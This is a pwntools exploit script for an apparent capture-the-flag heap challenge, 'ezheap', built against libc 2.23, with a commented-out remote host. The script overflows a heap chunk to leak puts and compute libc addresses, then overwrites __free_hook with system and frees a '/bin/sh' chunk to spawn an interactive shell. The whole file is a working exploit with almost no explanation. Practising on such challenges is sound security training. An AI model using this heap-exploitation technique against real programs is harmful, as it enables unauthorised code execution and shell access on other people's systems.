from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])



io=process("./ezheap")
# io=remote("43.143.7.127",28232)
elf=ELF("./ezheap")
libc=ELF("./libc-2.23.so")


def add(n,s,c,cc):
    io.recvuntil("Choice: \n")
    io.send(b"1")
    io.recvuntil("Input your idx:\n")
    io.send(str(n))
    io.recvuntil(b"Size:\n")
    io.send(str(s))
    io.recvuntil(b"Name: \n")
    io.send(c)
    io.recvuntil(b"Content:\n")
    io.send(cc)

def delete(n):
    io.recvuntil("Choice: \n")
    io.send(b"2")
    io.recvuntil("Input your idx:\n")
    io.send(str(n))

def show(n):
    io.recvuntil("Choice: \n")
    io.send(b"3")
    io.recvuntil("Input your idx:\n")
    io.send(str(n))

def edit(n,s,c):
    io.recvuntil("Choice: \n")
    io.send(b"4")
    io.recvuntil("Input your idx:\n")
    io.send(str(n))
    io.recvuntil(b"Size:\n")
    io.send(str(s))
    io.send(c)

add(0,0x40,b"asd",b"asd") #0
add(1,0x40,b"asd",b"asd") #1
# add(2,0x40,b"asd",b"asd")

gdb.attach(io)
pause()

edit(0,0x70,cyclic(0x70))  #0x70bytes到puts的内存地址

show(0) #overlapped chunk 0

leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.sym[b"puts"]

print("leak_addr:  "+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b"system"]
malloc_hook=leak_addr+libc.sym[b"__malloc_hook"]
free_hook=leak_addr+libc.sym[b"__free_hook"]

payload=cyclic(0x40)+p64(0)+p64(0x31)+p64(0)*2+p64(free_hook-8)+p64(1)
edit(0,len(payload),payload)
payload=b"/bin/sh\x00"+p64(sys_addr)
edit(1,len(payload),payload)
delete(1)

io.interactive()
